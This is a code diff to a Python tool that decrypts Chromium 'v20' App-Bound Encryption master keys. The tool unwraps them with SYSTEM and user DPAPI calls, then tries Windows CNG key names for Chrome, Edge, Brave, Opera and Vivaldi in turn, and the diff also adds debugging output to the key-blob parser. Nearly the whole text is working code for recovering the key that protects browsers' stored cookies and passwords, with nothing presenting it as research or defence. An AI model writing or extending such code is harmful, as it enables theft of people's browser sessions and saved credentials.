@@ -219,41 +219,63 @@ def decrypt_with_cng(input_data: bytes) -> bytes:
     status = NCryptOpenStorageProvider(ctypes.byref(hProvider), "Microsoft Software Key Storage Provider", 0)
     if status != 0: raise Exception(f"NCryptOpenStorageProvider failed: {status}")
 
-    hKey = ctypes.c_void_p()
-    status = NCryptOpenKey(hProvider, ctypes.byref(hKey), "Google Chromekey1", 0, 0)
-    if status != 0: 
-        NCryptFreeObject(hProvider)
-        raise Exception(f"NCryptOpenKey failed: {status}")
+    # CNG App-Bound key names vary per browser. We iterate until one decrypts successfully.
+    key_names = [
+        "Google Chromekey1",    # Chrome
+        "Microsoft Edgekey1",   # Edge
+        "BraveSoftwarekey1",    # Brave (variantes)
+        "Brave Softwarekey1",
+        "Bravekey1",
+        "Operakey1",            # Opera
+        "Vivaldikey1"           # Vivaldi
+    ]
 
-    pcbResult = wintypes.DWORD(0)
-    input_buffer = (ctypes.c_ubyte * len(input_data)).from_buffer_copy(input_data)
+    for name in key_names:
+        hKey = ctypes.c_void_p()
+        status = NCryptOpenKey(hProvider, ctypes.byref(hKey), name, 0, 0)
+        if status != 0:
+            continue  # La llave no existe, probamos la siguiente
 
-    status = NCryptDecrypt(hKey, ctypes.byref(input_buffer), len(input_buffer), None, None, 0, ctypes.byref(pcbResult), NCRYPT_SILENT_FLAG)
-    if status != 0:
+        pcbResult = wintypes.DWORD(0)
+        input_buffer = (ctypes.c_ubyte * len(input_data)).from_buffer_copy(input_data)
+
+        # 1er pase: obtener tamaño necesario
+        status = NCryptDecrypt(hKey, ctypes.byref(input_buffer), len(input_buffer), None, None, 0, ctypes.byref(pcbResult), NCRYPT_SILENT_FLAG)
+        if status != 0:
+            NCryptFreeObject(hKey)
+            continue  # Falló la desencriptación con esta llave (no le corresponde a este navegador)
+
+        buffer_size = pcbResult.value
+        output_buffer = (ctypes.c_ubyte * buffer_size)()
+
+        # 2do pase: desencriptar
+        status = NCryptDecrypt(hKey, ctypes.byref(input_buffer), len(input_buffer), None, ctypes.byref(output_buffer), buffer_size, ctypes.byref(pcbResult), NCRYPT_SILENT_FLAG)
+        if status == 0:
+            NCryptFreeObject(hKey)
+            NCryptFreeObject(hProvider)
+            return bytes(output_buffer[:pcbResult.value])
+            
         NCryptFreeObject(hKey)
-        NCryptFreeObject(hProvider)
-        raise Exception(f"1st NCryptDecrypt failed: {status}")
 
-    buffer_size = pcbResult.value
-    output_buffer = (ctypes.c_ubyte * buffer_size)()
-
-    status = NCryptDecrypt(hKey, ctypes.byref(input_buffer), len(input_buffer), None, ctypes.byref(output_buffer), buffer_size, ctypes.byref(pcbResult), NCRYPT_SILENT_FLAG)
-    if status != 0:
-        NCryptFreeObject(hKey)
-        NCryptFreeObject(hProvider)
-        raise Exception(f"2nd NCryptDecrypt failed: {status}")
-
-    NCryptFreeObject(hKey)
     NCryptFreeObject(hProvider)
-    return bytes(output_buffer[:pcbResult.value])
+    raise Exception("No se pudo descifrar el blob CNG con ninguna llave de navegador conocida.")
 
 def parse_key_blob(blob_data: bytes) -> dict:
     buffer = io.BytesIO(blob_data)
     parsed_data = {}
-    header_len = struct.unpack('<I', buffer.read(4))[0]
-    parsed_data['header'] = buffer.read(header_len)
-    content_len = struct.unpack('<I', buffer.read(4))[0]
-    parsed_data['flag'] = buffer.read(1)[0]
+    
+    # Diagnóstico de estructura
+    if len(blob_data) == 32:
+        raise ValueError("Blob is exactly 32 bytes (Raw AES key?)")
+        
+    try:
+        header_len = struct.unpack('<I', buffer.read(4))[0]
+        parsed_data['header'] = buffer.read(header_len)
+        content_len = struct.unpack('<I', buffer.read(4))[0]
+        parsed_data['flag'] = buffer.read(1)[0]
+    except Exception as e:
+        hex_dump = blob_data[:16].hex()
+        raise ValueError(f"Struct unpack failed. Len: {len(blob_data)}, Hex: {hex_dump}. Err: {e}")
     
     if parsed_data['flag'] in (1, 2):
         parsed_data['iv'] = buffer.read(12)
@@ -265,7 +287,8 @@ def parse_key_blob(blob_data: bytes) -> dict:
         parsed_data['ciphertext'] = buffer.read(32)
         parsed_data['tag'] = buffer.read(16)
     else:
-        raise ValueError(f"Unsupported flag: {parsed_data['flag']}")
+        hex_dump = blob_data[:16].hex()
+        raise ValueError(f"Unsupported flag: {parsed_data['flag']} | Len: {len(blob_data)} | HexStart: {hex_dump}")
 
     return parsed_data
 
@@ -306,7 +329,7 @@ def get_v20_key(encrypted_key_b64: bytes, win32crypt_module) -> bytes | None:
     try:
         raw = base64.b64decode(encrypted_key_b64)
         if not raw.startswith(b"APPB"):
-            return None
+            raise ValueError("Blob v20 no empieza con APPB")
             
         key_blob_encrypted = raw[4:]
         
@@ -314,18 +337,16 @@ def get_v20_key(encrypted_key_b64: bytes, win32crypt_module) -> bytes | None:
             try:
                 key_blob_system_decrypted = win32crypt_module.CryptUnprotectData(key_blob_encrypted, None, None, None, 0)[1]
             except Exception as e:
-                logger.debug(f"SYSTEM CryptUnprotectData failed: {e}")
-                return None
+                raise Exception(f"SYSTEM CryptUnprotectData failed: {e}")
                 
         try:
             key_blob_user_decrypted = win32crypt_module.CryptUnprotectData(key_blob_system_decrypted, None, None, None, 0)[1]
         except Exception as e:
-            logger.debug(f"User CryptUnprotectData failed: {e}")
-            return None
+            raise Exception(f"User CryptUnprotectData failed: {e}")
             
         parsed_data = parse_key_blob(key_blob_user_decrypted)
         return derive_v20_master_key(parsed_data)
         
     except Exception as e:
         logger.debug(f"get_v20_key failed: {e}")
-        return None
+        raise e
